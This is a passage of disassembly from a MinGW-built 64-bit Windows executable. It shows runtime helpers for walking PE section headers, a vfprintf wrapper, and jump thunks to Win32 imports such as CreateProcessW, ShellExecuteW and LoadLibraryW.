   140004c4f:	0f b7 03             	movzwl (%rbx),%eax
   140004c52:	3d 4d 5a 00 00       	cmp    $0x5a4d,%eax
   140004c57:	75 5c                	jne    140004cb5 <_FindPESectionByName+0x85>
   140004c59:	48 63 43 3c          	movslq 0x3c(%rbx),%rax
   140004c5d:	81 3c 03 50 45 00 00 	cmpl   $0x4550,(%rbx,%rax,1)
   140004c64:	75 4d                	jne    140004cb3 <_FindPESectionByName+0x83>
   140004c66:	48 01 c3             	add    %rax,%rbx
   140004c69:	66 81 7b 18 0b 02    	cmpw   $0x20b,0x18(%rbx)
   140004c6f:	75 42                	jne    140004cb3 <_FindPESectionByName+0x83>
   140004c71:	66 83 7b 06 00       	cmpw   $0x0,0x6(%rbx)
   140004c76:	74 3b                	je     140004cb3 <_FindPESectionByName+0x83>
   140004c78:	0f b7 43 14          	movzwl 0x14(%rbx),%eax
   140004c7c:	48 8d 3c 18          	lea    (%rax,%rbx,1),%rdi
   140004c80:	48 83 c7 18          	add    $0x18,%rdi
   140004c84:	31 ed                	xor    %ebp,%ebp
   140004c86:	66 2e 0f 1f 84 00 00 	cs nopw 0x0(%rax,%rax,1)
   140004c8d:	00 00 00 
   140004c90:	41 b8 08 00 00 00    	mov    $0x8,%r8d
   140004c96:	48 89 f9             	mov    %rdi,%rcx
   140004c99:	48 89 f2             	mov    %rsi,%rdx
   140004c9c:	e8 cf 0a 00 00       	call   140005770 <strncmp>
   140004ca1:	85 c0                	test   %eax,%eax
   140004ca3:	74 10                	je     140004cb5 <_FindPESectionByName+0x85>
   140004ca5:	ff c5                	inc    %ebp
   140004ca7:	48 83 c7 28          	add    $0x28,%rdi
   140004cab:	0f b7 43 06          	movzwl 0x6(%rbx),%eax
   140004caf:	39 c5                	cmp    %eax,%ebp
   140004cb1:	72 dd                	jb     140004c90 <_FindPESectionByName+0x60>
   140004cb3:	31 ff                	xor    %edi,%edi
   140004cb5:	48 89 f8             	mov    %rdi,%rax
   140004cb8:	48 83 c4 28          	add    $0x28,%rsp
   140004cbc:	5b                   	pop    %rbx
   140004cbd:	5d                   	pop    %rbp
   140004cbe:	5f                   	pop    %rdi
   140004cbf:	5e                   	pop    %rsi
   140004cc0:	c3                   	ret
   140004cc1:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140004cc8:	0f 1f 84 00 00 00 00 
   140004ccf:	00 

0000000140004cd0 <__mingw_GetSectionForAddress>:
   140004cd0:	48 8b 05 31 13 00 00 	mov    0x1331(%rip),%rax        # 140006008 <.refptr.__ImageBase>
   140004cd7:	66 81 38 4d 5a       	cmpw   $0x5a4d,(%rax)
   140004cdc:	75 5d                	jne    140004d3b <__mingw_GetSectionForAddress+0x6b>
   140004cde:	48 63 50 3c          	movslq 0x3c(%rax),%rdx
   140004ce2:	81 3c 10 50 45 00 00 	cmpl   $0x4550,(%rax,%rdx,1)
   140004ce9:	75 50                	jne    140004d3b <__mingw_GetSectionForAddress+0x6b>
   140004ceb:	48 01 d0             	add    %rdx,%rax
   140004cee:	66 81 78 18 0b 02    	cmpw   $0x20b,0x18(%rax)
   140004cf4:	75 45                	jne    140004d3b <__mingw_GetSectionForAddress+0x6b>
   140004cf6:	0f b7 50 06          	movzwl 0x6(%rax),%edx
   140004cfa:	85 d2                	test   %edx,%edx
   140004cfc:	74 3d                	je     140004d3b <__mingw_GetSectionForAddress+0x6b>
   140004cfe:	48 2b 0d 03 13 00 00 	sub    0x1303(%rip),%rcx        # 140006008 <.refptr.__ImageBase>
   140004d05:	44 0f b7 40 14       	movzwl 0x14(%rax),%r8d
   140004d0a:	4c 01 c0             	add    %r8,%rax
   140004d0d:	48 83 c0 18          	add    $0x18,%rax
   140004d11:	eb 15                	jmp    140004d28 <__mingw_GetSectionForAddress+0x58>
   140004d13:	66 66 66 66 2e 0f 1f 	data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140004d1a:	84 00 00 00 00 00 
   140004d20:	48 83 c0 28          	add    $0x28,%rax
   140004d24:	ff ca                	dec    %edx
   140004d26:	74 13                	je     140004d3b <__mingw_GetSectionForAddress+0x6b>
   140004d28:	44 8b 40 0c          	mov    0xc(%rax),%r8d
   140004d2c:	4c 39 c1             	cmp    %r8,%rcx
   140004d2f:	72 ef                	jb     140004d20 <__mingw_GetSectionForAddress+0x50>
   140004d31:	44 03 40 08          	add    0x8(%rax),%r8d
   140004d35:	4c 39 c1             	cmp    %r8,%rcx
   140004d38:	73 e6                	jae    140004d20 <__mingw_GetSectionForAddress+0x50>
   140004d3a:	c3                   	ret
   140004d3b:	31 c0                	xor    %eax,%eax
   140004d3d:	c3                   	ret
   140004d3e:	66 90                	xchg   %ax,%ax

0000000140004d40 <__mingw_GetSectionCount>:
   140004d40:	48 8b 0d c1 12 00 00 	mov    0x12c1(%rip),%rcx        # 140006008 <.refptr.__ImageBase>
   140004d47:	31 c0                	xor    %eax,%eax
   140004d49:	66 81 39 4d 5a       	cmpw   $0x5a4d,(%rcx)
   140004d4e:	75 1b                	jne    140004d6b <__mingw_GetSectionCount+0x2b>
   140004d50:	48 63 51 3c          	movslq 0x3c(%rcx),%rdx
   140004d54:	81 3c 11 50 45 00 00 	cmpl   $0x4550,(%rcx,%rdx,1)
   140004d5b:	75 0e                	jne    140004d6b <__mingw_GetSectionCount+0x2b>
   140004d5d:	66 81 7c 11 18 0b 02 	cmpw   $0x20b,0x18(%rcx,%rdx,1)
   140004d64:	75 05                	jne    140004d6b <__mingw_GetSectionCount+0x2b>
   140004d66:	0f b7 44 11 06       	movzwl 0x6(%rcx,%rdx,1),%eax
   140004d6b:	c3                   	ret
   140004d6c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000140004d70 <_FindPESectionExec>:
   140004d70:	48 8b 05 91 12 00 00 	mov    0x1291(%rip),%rax        # 140006008 <.refptr.__ImageBase>
   140004d77:	66 81 38 4d 5a       	cmpw   $0x5a4d,(%rax)
   140004d7c:	75 4a                	jne    140004dc8 <_FindPESectionExec+0x58>
   140004d7e:	48 63 50 3c          	movslq 0x3c(%rax),%rdx
   140004d82:	81 3c 10 50 45 00 00 	cmpl   $0x4550,(%rax,%rdx,1)
   140004d89:	75 3d                	jne    140004dc8 <_FindPESectionExec+0x58>
   140004d8b:	48 01 d0             	add    %rdx,%rax
   140004d8e:	66 81 78 18 0b 02    	cmpw   $0x20b,0x18(%rax)
   140004d94:	75 32                	jne    140004dc8 <_FindPESectionExec+0x58>
   140004d96:	0f b7 50 06          	movzwl 0x6(%rax),%edx
   140004d9a:	85 d2                	test   %edx,%edx
   140004d9c:	74 2a                	je     140004dc8 <_FindPESectionExec+0x58>
   140004d9e:	44 0f b7 40 14       	movzwl 0x14(%rax),%r8d
   140004da3:	4c 01 c0             	add    %r8,%rax
   140004da6:	48 83 c0 18          	add    $0x18,%rax
   140004daa:	eb 0c                	jmp    140004db8 <_FindPESectionExec+0x48>
   140004dac:	0f 1f 40 00          	nopl   0x0(%rax)
   140004db0:	48 83 c0 28          	add    $0x28,%rax
   140004db4:	ff ca                	dec    %edx
   140004db6:	74 10                	je     140004dc8 <_FindPESectionExec+0x58>
   140004db8:	f6 40 27 20          	testb  $0x20,0x27(%rax)
   140004dbc:	74 f2                	je     140004db0 <_FindPESectionExec+0x40>
   140004dbe:	48 85 c9             	test   %rcx,%rcx
   140004dc1:	74 07                	je     140004dca <_FindPESectionExec+0x5a>
   140004dc3:	48 ff c9             	dec    %rcx
   140004dc6:	eb e8                	jmp    140004db0 <_FindPESectionExec+0x40>
   140004dc8:	31 c0                	xor    %eax,%eax
   140004dca:	c3                   	ret
   140004dcb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)

0000000140004dd0 <_GetPEImageBase>:
   140004dd0:	48 8b 05 31 12 00 00 	mov    0x1231(%rip),%rax        # 140006008 <.refptr.__ImageBase>
   140004dd7:	66 81 38 4d 5a       	cmpw   $0x5a4d,(%rax)
   140004ddc:	75 16                	jne    140004df4 <_GetPEImageBase+0x24>
   140004dde:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   140004de2:	81 3c 08 50 45 00 00 	cmpl   $0x4550,(%rax,%rcx,1)
   140004de9:	75 09                	jne    140004df4 <_GetPEImageBase+0x24>
   140004deb:	66 81 7c 08 18 0b 02 	cmpw   $0x20b,0x18(%rax,%rcx,1)
   140004df2:	74 02                	je     140004df6 <_GetPEImageBase+0x26>
   140004df4:	31 c0                	xor    %eax,%eax
   140004df6:	c3                   	ret
   140004df7:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   140004dfe:	00 00 

0000000140004e00 <_IsNonwritableInCurrentImage>:
   140004e00:	48 8b 15 01 12 00 00 	mov    0x1201(%rip),%rdx        # 140006008 <.refptr.__ImageBase>
   140004e07:	31 c0                	xor    %eax,%eax
   140004e09:	66 81 3a 4d 5a       	cmpw   $0x5a4d,(%rdx)
   140004e0e:	75 76                	jne    140004e86 <_IsNonwritableInCurrentImage+0x86>
   140004e10:	4c 63 42 3c          	movslq 0x3c(%rdx),%r8
   140004e14:	42 81 3c 02 50 45 00 	cmpl   $0x4550,(%rdx,%r8,1)
   140004e1b:	00 
   140004e1c:	75 68                	jne    140004e86 <_IsNonwritableInCurrentImage+0x86>
   140004e1e:	4c 01 c2             	add    %r8,%rdx
   140004e21:	66 81 7a 18 0b 02    	cmpw   $0x20b,0x18(%rdx)
   140004e27:	75 5d                	jne    140004e86 <_IsNonwritableInCurrentImage+0x86>
   140004e29:	44 0f b7 42 06       	movzwl 0x6(%rdx),%r8d
   140004e2e:	4d 85 c0             	test   %r8,%r8
   140004e31:	74 53                	je     140004e86 <_IsNonwritableInCurrentImage+0x86>
   140004e33:	48 2b 0d ce 11 00 00 	sub    0x11ce(%rip),%rcx        # 140006008 <.refptr.__ImageBase>
   140004e3a:	0f b7 42 14          	movzwl 0x14(%rdx),%eax
   140004e3e:	48 01 d0             	add    %rdx,%rax
   140004e41:	48 83 c0 18          	add    $0x18,%rax
   140004e45:	41 c1 e0 03          	shl    $0x3,%r8d
   140004e49:	4f 8d 04 80          	lea    (%r8,%r8,4),%r8
   140004e4d:	31 d2                	xor    %edx,%edx
   140004e4f:	eb 18                	jmp    140004e69 <_IsNonwritableInCurrentImage+0x69>
   140004e51:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140004e58:	0f 1f 84 00 00 00 00 
   140004e5f:	00 
   140004e60:	48 83 c2 28          	add    $0x28,%rdx
   140004e64:	41 39 d0             	cmp    %edx,%r8d
   140004e67:	74 1e                	je     140004e87 <_IsNonwritableInCurrentImage+0x87>
   140004e69:	44 8b 4c 10 0c       	mov    0xc(%rax,%rdx,1),%r9d
   140004e6e:	4c 39 c9             	cmp    %r9,%rcx
   140004e71:	72 ed                	jb     140004e60 <_IsNonwritableInCurrentImage+0x60>
   140004e73:	44 03 4c 10 08       	add    0x8(%rax,%rdx,1),%r9d
   140004e78:	4c 39 c9             	cmp    %r9,%rcx
   140004e7b:	73 e3                	jae    140004e60 <_IsNonwritableInCurrentImage+0x60>
   140004e7d:	8b 44 10 24          	mov    0x24(%rax,%rdx,1),%eax
   140004e81:	f7 d0                	not    %eax
   140004e83:	c1 e8 1f             	shr    $0x1f,%eax
   140004e86:	c3                   	ret
   140004e87:	31 c0                	xor    %eax,%eax
   140004e89:	c3                   	ret
   140004e8a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

0000000140004e90 <__mingw_enum_import_library_names>:
   140004e90:	56                   	push   %rsi
   140004e91:	48 8b 15 70 11 00 00 	mov    0x1170(%rip),%rdx        # 140006008 <.refptr.__ImageBase>
   140004e98:	66 81 3a 4d 5a       	cmpw   $0x5a4d,(%rdx)
   140004e9d:	75 7e                	jne    140004f1d <__mingw_enum_import_library_names+0x8d>
   140004e9f:	48 63 42 3c          	movslq 0x3c(%rdx),%rax
   140004ea3:	81 3c 02 50 45 00 00 	cmpl   $0x4550,(%rdx,%rax,1)
   140004eaa:	75 71                	jne    140004f1d <__mingw_enum_import_library_names+0x8d>
   140004eac:	48 01 d0             	add    %rdx,%rax
   140004eaf:	66 81 78 18 0b 02    	cmpw   $0x20b,0x18(%rax)
   140004eb5:	75 66                	jne    140004f1d <__mingw_enum_import_library_names+0x8d>
   140004eb7:	44 8b 80 90 00 00 00 	mov    0x90(%rax),%r8d
   140004ebe:	4d 85 c0             	test   %r8,%r8
   140004ec1:	74 5a                	je     140004f1d <__mingw_enum_import_library_names+0x8d>
   140004ec3:	44 0f b7 48 06       	movzwl 0x6(%rax),%r9d
   140004ec8:	4d 85 c9             	test   %r9,%r9
   140004ecb:	74 50                	je     140004f1d <__mingw_enum_import_library_names+0x8d>
   140004ecd:	44 0f b7 50 14       	movzwl 0x14(%rax),%r10d
   140004ed2:	41 c1 e1 03          	shl    $0x3,%r9d
   140004ed6:	4f 8d 0c 89          	lea    (%r9,%r9,4),%r9
   140004eda:	49 01 c2             	add    %rax,%r10
   140004edd:	49 83 c2 24          	add    $0x24,%r10
   140004ee1:	31 c0                	xor    %eax,%eax
   140004ee3:	45 31 db             	xor    %r11d,%r11d
   140004ee6:	eb 11                	jmp    140004ef9 <__mingw_enum_import_library_names+0x69>
   140004ee8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   140004eef:	00 
   140004ef0:	49 83 c3 28          	add    $0x28,%r11
   140004ef4:	45 39 d9             	cmp    %r11d,%r9d
   140004ef7:	74 26                	je     140004f1f <__mingw_enum_import_library_names+0x8f>
   140004ef9:	43 8b 34 1a          	mov    (%r10,%r11,1),%esi
   140004efd:	41 39 f0             	cmp    %esi,%r8d
   140004f00:	72 ee                	jb     140004ef0 <__mingw_enum_import_library_names+0x60>
   140004f02:	43 03 74 1a fc       	add    -0x4(%r10,%r11,1),%esi
   140004f07:	41 39 f0             	cmp    %esi,%r8d
   140004f0a:	73 e4                	jae    140004ef0 <__mingw_enum_import_library_names+0x60>
   140004f0c:	4c 01 c2             	add    %r8,%rdx
   140004f0f:	48 83 c2 0c          	add    $0xc,%rdx
   140004f13:	31 c0                	xor    %eax,%eax
   140004f15:	83 7a f8 00          	cmpl   $0x0,-0x8(%rdx)
   140004f19:	75 26                	jne    140004f41 <__mingw_enum_import_library_names+0xb1>
   140004f1b:	eb 1f                	jmp    140004f3c <__mingw_enum_import_library_names+0xac>
   140004f1d:	31 c0                	xor    %eax,%eax
   140004f1f:	5e                   	pop    %rsi
   140004f20:	c3                   	ret
   140004f21:	66 66 66 66 66 66 2e 	data16 data16 data16 data16 data16 cs nopw 0x0(%rax,%rax,1)
   140004f28:	0f 1f 84 00 00 00 00 
   140004f2f:	00 
   140004f30:	ff c9                	dec    %ecx
   140004f32:	48 83 c2 14          	add    $0x14,%rdx
   140004f36:	83 7a f8 00          	cmpl   $0x0,-0x8(%rdx)
   140004f3a:	75 05                	jne    140004f41 <__mingw_enum_import_library_names+0xb1>
   140004f3c:	83 3a 00             	cmpl   $0x0,(%rdx)
   140004f3f:	74 de                	je     140004f1f <__mingw_enum_import_library_names+0x8f>
   140004f41:	85 c9                	test   %ecx,%ecx
   140004f43:	7f eb                	jg     140004f30 <__mingw_enum_import_library_names+0xa0>
   140004f45:	8b 02                	mov    (%rdx),%eax
   140004f47:	48 03 05 ba 10 00 00 	add    0x10ba(%rip),%rax        # 140006008 <.refptr.__ImageBase>
   140004f4e:	5e                   	pop    %rsi
   140004f4f:	c3                   	ret

0000000140004f50 <vfprintf>:
   140004f50:	56                   	push   %rsi
   140004f51:	57                   	push   %rdi
   140004f52:	53                   	push   %rbx
   140004f53:	48 83 ec 30          	sub    $0x30,%rsp
   140004f57:	4c 89 c6             	mov    %r8,%rsi
   140004f5a:	48 89 d7             	mov    %rdx,%rdi
   140004f5d:	48 89 cb             	mov    %rcx,%rbx
   140004f60:	e8 3b 00 00 00       	call   140004fa0 <__local_stdio_printf_options>
   140004f65:	48 8b 08             	mov    (%rax),%rcx
   140004f68:	48 89 74 24 20       	mov    %rsi,0x20(%rsp)
   140004f6d:	48 89 da             	mov    %rbx,%rdx
   140004f70:	49 89 f8             	mov    %rdi,%r8
   140004f73:	45 31 c9             	xor    %r9d,%r9d
   140004f76:	e8 d5 07 00 00       	call   140005750 <__stdio_common_vfprintf>
   140004f7b:	90                   	nop
   140004f7c:	48 83 c4 30          	add    $0x30,%rsp
   140004f80:	5b                   	pop    %rbx
   140004f81:	5f                   	pop    %rdi
   140004f82:	5e                   	pop    %rsi
   140004f83:	c3                   	ret
   140004f84:	cc                   	int3
   140004f85:	cc                   	int3
   140004f86:	cc                   	int3
   140004f87:	cc                   	int3
   140004f88:	cc                   	int3
   140004f89:	cc                   	int3
   140004f8a:	cc                   	int3
   140004f8b:	cc                   	int3
   140004f8c:	cc                   	int3
   140004f8d:	cc                   	int3
   140004f8e:	cc                   	int3
   140004f8f:	cc                   	int3

0000000140004f90 <__guard_dispatch_icall_dummy>:
   140004f90:	ff e0                	jmp    *%rax
   140004f92:	cc                   	int3
   140004f93:	cc                   	int3
   140004f94:	cc                   	int3
   140004f95:	cc                   	int3
   140004f96:	cc                   	int3
   140004f97:	cc                   	int3
   140004f98:	cc                   	int3
   140004f99:	cc                   	int3
   140004f9a:	cc                   	int3
   140004f9b:	cc                   	int3
   140004f9c:	cc                   	int3
   140004f9d:	cc                   	int3
   140004f9e:	cc                   	int3
   140004f9f:	cc                   	int3

0000000140004fa0 <__local_stdio_printf_options>:
   140004fa0:	48 8d 05 d1 50 07 00 	lea    0x750d1(%rip),%rax        # 14007a078 <options>
   140004fa7:	c3                   	ret
   140004fa8:	cc                   	int3
   140004fa9:	cc                   	int3
   140004faa:	cc                   	int3
   140004fab:	cc                   	int3
   140004fac:	cc                   	int3
   140004fad:	cc                   	int3
   140004fae:	cc                   	int3
   140004faf:	cc                   	int3
   140004fb0:	ff 25 9a 29 07 00    	jmp    *0x7299a(%rip)        # 140077950 <__imp_CoInitializeEx>
   140004fb6:	cc                   	int3
   140004fb7:	cc                   	int3
   140004fb8:	cc                   	int3
   140004fb9:	cc                   	int3
   140004fba:	cc                   	int3
   140004fbb:	cc                   	int3
   140004fbc:	cc                   	int3
   140004fbd:	cc                   	int3
   140004fbe:	cc                   	int3
   140004fbf:	cc                   	int3
   140004fc0:	ff 25 92 29 07 00    	jmp    *0x72992(%rip)        # 140077958 <__imp_CoTaskMemFree>
   140004fc6:	cc                   	int3
   140004fc7:	cc                   	int3
   140004fc8:	cc                   	int3
   140004fc9:	cc                   	int3
   140004fca:	cc                   	int3
   140004fcb:	cc                   	int3
   140004fcc:	cc                   	int3
   140004fcd:	cc                   	int3
   140004fce:	cc                   	int3
   140004fcf:	cc                   	int3
   140004fd0:	ff 25 8a 29 07 00    	jmp    *0x7298a(%rip)        # 140077960 <__imp_CoUninitialize>
   140004fd6:	cc                   	int3
   140004fd7:	cc                   	int3
   140004fd8:	cc                   	int3
   140004fd9:	cc                   	int3
   140004fda:	cc                   	int3
   140004fdb:	cc                   	int3
   140004fdc:	cc                   	int3
   140004fdd:	cc                   	int3
   140004fde:	cc                   	int3
   140004fdf:	cc                   	int3
   140004fe0:	ff 25 8a 29 07 00    	jmp    *0x7298a(%rip)        # 140077970 <__imp_ShellExecuteW>
   140004fe6:	cc                   	int3
   140004fe7:	cc                   	int3
   140004fe8:	cc                   	int3
   140004fe9:	cc                   	int3
   140004fea:	cc                   	int3
   140004feb:	cc                   	int3
   140004fec:	cc                   	int3
   140004fed:	cc                   	int3
   140004fee:	cc                   	int3
   140004fef:	cc                   	int3

0000000140004ff0 <__C_specific_handler>:
   140004ff0:	ff 25 92 2a 07 00    	jmp    *0x72a92(%rip)        # 140077a88 <__imp___C_specific_handler>
   140004ff6:	cc                   	int3
   140004ff7:	cc                   	int3
   140004ff8:	cc                   	int3
   140004ff9:	cc                   	int3
   140004ffa:	cc                   	int3
   140004ffb:	cc                   	int3
   140004ffc:	cc                   	int3
   140004ffd:	cc                   	int3
   140004ffe:	cc                   	int3
   140004fff:	cc                   	int3
   140005000:	ff 25 7a 29 07 00    	jmp    *0x7297a(%rip)        # 140077980 <__imp_CloseHandle>
   140005006:	cc                   	int3
   140005007:	cc                   	int3
   140005008:	cc                   	int3
   140005009:	cc                   	int3
   14000500a:	cc                   	int3
   14000500b:	cc                   	int3
   14000500c:	cc                   	int3
   14000500d:	cc                   	int3
   14000500e:	cc                   	int3
   14000500f:	cc                   	int3
   140005010:	ff 25 72 29 07 00    	jmp    *0x72972(%rip)        # 140077988 <__imp_CreateDirectoryW>
   140005016:	cc                   	int3
   140005017:	cc                   	int3
   140005018:	cc                   	int3
   140005019:	cc                   	int3
   14000501a:	cc                   	int3
   14000501b:	cc                   	int3
   14000501c:	cc                   	int3
   14000501d:	cc                   	int3
   14000501e:	cc                   	int3
   14000501f:	cc                   	int3
   140005020:	ff 25 6a 29 07 00    	jmp    *0x7296a(%rip)        # 140077990 <__imp_CreateFileW>
   140005026:	cc                   	int3
   140005027:	cc                   	int3
   140005028:	cc                   	int3
   140005029:	cc                   	int3
   14000502a:	cc                   	int3
   14000502b:	cc                   	int3
   14000502c:	cc                   	int3
   14000502d:	cc                   	int3
   14000502e:	cc                   	int3
   14000502f:	cc                   	int3
   140005030:	ff 25 62 29 07 00    	jmp    *0x72962(%rip)        # 140077998 <__imp_CreateProcessW>
   140005036:	cc                   	int3
   140005037:	cc                   	int3
   140005038:	cc                   	int3
   140005039:	cc                   	int3
   14000503a:	cc                   	int3
   14000503b:	cc                   	int3
   14000503c:	cc                   	int3
   14000503d:	cc                   	int3
   14000503e:	cc                   	int3
   14000503f:	cc                   	int3
   140005040:	ff 25 62 29 07 00    	jmp    *0x72962(%rip)        # 1400779a8 <__imp_DeleteFileW>
   140005046:	cc                   	int3
   140005047:	cc                   	int3
   140005048:	cc                   	int3
   140005049:	cc                   	int3
   14000504a:	cc                   	int3
   14000504b:	cc                   	int3
   14000504c:	cc                   	int3
   14000504d:	cc                   	int3
   14000504e:	cc                   	int3
   14000504f:	cc                   	int3
   140005050:	ff 25 62 29 07 00    	jmp    *0x72962(%rip)        # 1400779b8 <__imp_FreeLibrary>
   140005056:	cc                   	int3
   140005057:	cc                   	int3
   140005058:	cc                   	int3
   140005059:	cc                   	int3
   14000505a:	cc                   	int3
   14000505b:	cc                   	int3
   14000505c:	cc                   	int3
   14000505d:	cc                   	int3
   14000505e:	cc                   	int3
   14000505f:	cc                   	int3
   140005060:	ff 25 5a 29 07 00    	jmp    *0x7295a(%rip)        # 1400779c0 <__imp_GetEnvironmentVariableW>
   140005066:	cc                   	int3
   140005067:	cc                   	int3
   140005068:	cc                   	int3
   140005069:	cc                   	int3
   14000506a:	cc                   	int3
   14000506b:	cc                   	int3
   14000506c:	cc                   	int3
   14000506d:	cc                   	int3
   14000506e:	cc                   	int3
   14000506f:	cc                   	int3
   140005070:	ff 25 52 29 07 00    	jmp    *0x72952(%rip)        # 1400779c8 <__imp_GetExitCodeProcess>
   140005076:	cc                   	int3
   140005077:	cc                   	int3
   140005078:	cc                   	int3
   140005079:	cc                   	int3
   14000507a:	cc                   	int3
   14000507b:	cc                   	int3
   14000507c:	cc                   	int3
   14000507d:	cc                   	int3
   14000507e:	cc                   	int3
   14000507f:	cc                   	int3
   140005080:	ff 25 4a 29 07 00    	jmp    *0x7294a(%rip)        # 1400779d0 <__imp_GetFileAttributesExW>
   140005086:	cc                   	int3
   140005087:	cc                   	int3
   140005088:	cc                   	int3
   140005089:	cc                   	int3
   14000508a:	cc                   	int3
   14000508b:	cc                   	int3
   14000508c:	cc                   	int3
   14000508d:	cc                   	int3
   14000508e:	cc                   	int3
   14000508f:	cc                   	int3
   140005090:	ff 25 42 29 07 00    	jmp    *0x72942(%rip)        # 1400779d8 <__imp_GetFileAttributesW>
   140005096:	cc                   	int3
   140005097:	cc                   	int3
   140005098:	cc                   	int3
   140005099:	cc                   	int3
   14000509a:	cc                   	int3
   14000509b:	cc                   	int3
   14000509c:	cc                   	int3
   14000509d:	cc                   	int3
   14000509e:	cc                   	int3
   14000509f:	cc                   	int3
   1400050a0:	ff 25 3a 29 07 00    	jmp    *0x7293a(%rip)        # 1400779e0 <__imp_GetLastError>
   1400050a6:	cc                   	int3
   1400050a7:	cc                   	int3
   1400050a8:	cc                   	int3
   1400050a9:	cc                   	int3
   1400050aa:	cc                   	int3
   1400050ab:	cc                   	int3
   1400050ac:	cc                   	int3
   1400050ad:	cc                   	int3
   1400050ae:	cc                   	int3
   1400050af:	cc                   	int3
   1400050b0:	ff 25 32 29 07 00    	jmp    *0x72932(%rip)        # 1400779e8 <__imp_GetModuleHandleW>
   1400050b6:	cc                   	int3
   1400050b7:	cc                   	int3
   1400050b8:	cc                   	int3
   1400050b9:	cc                   	int3
   1400050ba:	cc                   	int3
   1400050bb:	cc                   	int3
   1400050bc:	cc                   	int3
   1400050bd:	cc                   	int3
   1400050be:	cc                   	int3
   1400050bf:	cc                   	int3
   1400050c0:	ff 25 2a 29 07 00    	jmp    *0x7292a(%rip)        # 1400779f0 <__imp_GetProcAddress>
   1400050c6:	cc                   	int3
   1400050c7:	cc                   	int3
   1400050c8:	cc                   	int3
   1400050c9:	cc                   	int3
   1400050ca:	cc                   	int3
   1400050cb:	cc                   	int3
   1400050cc:	cc                   	int3
   1400050cd:	cc                   	int3
   1400050ce:	cc                   	int3
   1400050cf:	cc                   	int3
   1400050d0:	ff 25 22 29 07 00    	jmp    *0x72922(%rip)        # 1400779f8 <__imp_GetProcessHeap>
   1400050d6:	cc                   	int3
   1400050d7:	cc                   	int3
   1400050d8:	cc                   	int3
   1400050d9:	cc                   	int3
   1400050da:	cc                   	int3
   1400050db:	cc                   	int3
   1400050dc:	cc                   	int3
   1400050dd:	cc                   	int3
   1400050de:	cc                   	int3
   1400050df:	cc                   	int3
   1400050e0:	ff 25 22 29 07 00    	jmp    *0x72922(%rip)        # 140077a08 <__imp_GetSystemDirectoryW>
   1400050e6:	cc                   	int3
   1400050e7:	cc                   	int3
   1400050e8:	cc                   	int3
   1400050e9:	cc                   	int3
   1400050ea:	cc                   	int3
   1400050eb:	cc                   	int3
   1400050ec:	cc                   	int3
   1400050ed:	cc                   	int3
   1400050ee:	cc                   	int3
   1400050ef:	cc                   	int3
   1400050f0:	ff 25 1a 29 07 00    	jmp    *0x7291a(%rip)        # 140077a10 <__imp_GetTempPathW>
   1400050f6:	cc                   	int3
   1400050f7:	cc                   	int3
   1400050f8:	cc                   	int3
   1400050f9:	cc                   	int3
   1400050fa:	cc                   	int3
   1400050fb:	cc                   	int3
   1400050fc:	cc                   	int3
   1400050fd:	cc                   	int3
   1400050fe:	cc                   	int3
   1400050ff:	cc                   	int3
   140005100:	ff 25 12 29 07 00    	jmp    *0x72912(%rip)        # 140077a18 <__imp_GetUserDefaultLocaleName>
   140005106:	cc                   	int3
   140005107:	cc                   	int3
   140005108:	cc                   	int3
   140005109:	cc                   	int3
   14000510a:	cc                   	int3
   14000510b:	cc                   	int3
   14000510c:	cc                   	int3
   14000510d:	cc                   	int3
   14000510e:	cc                   	int3
   14000510f:	cc                   	int3
   140005110:	ff 25 0a 29 07 00    	jmp    *0x7290a(%rip)        # 140077a20 <__imp_HeapAlloc>
   140005116:	cc                   	int3
   140005117:	cc                   	int3
   140005118:	cc                   	int3
   140005119:	cc                   	int3
   14000511a:	cc                   	int3
   14000511b:	cc                   	int3
   14000511c:	cc                   	int3
   14000511d:	cc                   	int3
   14000511e:	cc                   	int3
   14000511f:	cc                   	int3
   140005120:	ff 25 02 29 07 00    	jmp    *0x72902(%rip)        # 140077a28 <__imp_HeapFree>
   140005126:	cc                   	int3
   140005127:	cc                   	int3
   140005128:	cc                   	int3
   140005129:	cc                   	int3
   14000512a:	cc                   	int3
   14000512b:	cc                   	int3
   14000512c:	cc                   	int3
   14000512d:	cc                   	int3
   14000512e:	cc                   	int3
   14000512f:	cc                   	int3
   140005130:	ff 25 0a 29 07 00    	jmp    *0x7290a(%rip)        # 140077a40 <__imp_LoadLibraryW>
   140005136:	cc                   	int3
   140005137:	cc                   	int3
   140005138:	cc                   	int3
   140005139:	cc                   	int3
   14000513a:	cc                   	int3
   14000513b:	cc                   	int3
   14000513c:	cc                   	int3
   14000513d:	cc                   	int3
   14000513e:	cc                   	int3
   14000513f:	cc                   	int3
   140005140:	ff 25 02 29 07 00    	jmp    *0x72902(%rip)        # 140077a48 <__imp_SetEnvironmentVariableW>
   140005146:	cc                   	int3
   140005147:	cc                   	int3
   140005148:	cc                   	int3
   140005149:	cc                   	int3
   14000514a:	cc                   	int3
   14000514b:	cc                   	int3
   14000514c:	cc                   	int3
   14000514d:	cc                   	int3
   14000514e:	cc                   	int3
   14000514f:	cc                   	int3
   140005150:	ff 25 fa 28 07 00    	jmp    *0x728fa(%rip)        # 140077a50 <__imp_SetUnhandledExceptionFilter>
   140005156:	cc                   	int3
   140005157:	cc                   	int3
   140005158:	cc                   	int3
   140005159:	cc                   	int3
   14000515a:	cc                   	int3
   14000515b:	cc                   	int3
   14000515c:	cc                   	int3
   14000515d:	cc                   	int3
   14000515e:	cc                   	int3
   14000515f:	cc                   	int3
   140005160:	ff 25 f2 28 07 00    	jmp    *0x728f2(%rip)        # 140077a58 <__imp_Sleep>
   140005166:	cc                   	int3
   140005167:	cc                   	int3
   140005168:	cc                   	int3
   140005169:	cc                   	int3
   14000516a:	cc                   	int3
   14000516b:	cc                   	int3
   14000516c:	cc                   	int3
   14000516d:	cc                   	int3
   14000516e:	cc                   	int3
   14000516f:	cc                   	int3
   140005170:	ff 25 02 29 07 00    	jmp    *0x72902(%rip)        # 140077a78 <__imp_WaitForSingleObject>
   140005176:	cc                   	int3
